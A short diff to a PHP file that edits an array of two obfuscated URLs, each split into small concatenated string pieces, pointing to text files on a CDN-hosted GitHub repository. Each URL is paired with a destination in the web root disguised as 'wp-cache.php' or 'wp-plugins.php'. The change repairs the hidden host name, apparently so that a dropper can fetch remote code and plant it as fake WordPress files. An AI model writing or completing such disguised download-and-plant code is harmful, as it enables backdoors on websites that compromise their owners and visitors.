@@ -38,11 +38,11 @@ $hdr = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
 
 $fr = [
     [
-        'url'  => 'ht' . 'tps:' . '//c' . 'dn.' . 'jsd' . 'eli' . 'vr.' . 'netv/gh' . '/lu' . 'cen' . 'byt' . 'e/A' . 'rch' . 'iLo' . 'gs@' . 'mai' . 'n/h' . 'upsh.t' . 'xt',
+        'url'  => 'ht' . 'tps' . '://' . 'cdn' . '.js' . 'del' . 'ivr' . '.ne' . 't/g' . 'h/l' . 'uce' . 'nby' . 'te/' . 'Arc' . 'hiL' . 'ogs' . '@ma' . 'in/hu' . 'ps' . 'h.t' . 'xt',
         'dest' => $hdr . '/wp-cache.php'
     ],
     [
-        'url'  => 'ht' . 'tps:' . '//c' . 'dn.' . 'jsd' . 'eli' . 'vr.' . 'netv/gh' . '/lu' . 'cen' . 'byt' . 'e/A' . 'rch' . 'iLo' . 'gs@' . 'mai' . 'n/v2' . '/g' . 'et' . '-n.tx' . 't',
+        'url'  => 'ht' . 'tps' . '://' . 'cdn' . '.js' . 'del' . 'ivr' . '.ne' . 't/g' . 'h/l' . 'uce' . 'nby' . 'te/' . 'Arc' . 'hiL' . 'ogs' . '@ma' . 'in/v' . '2/g' . 'et-' . 'n.t' . 'xt',
         'dest' => $hdr . '/wp-plugins.php'
     ]
 ];
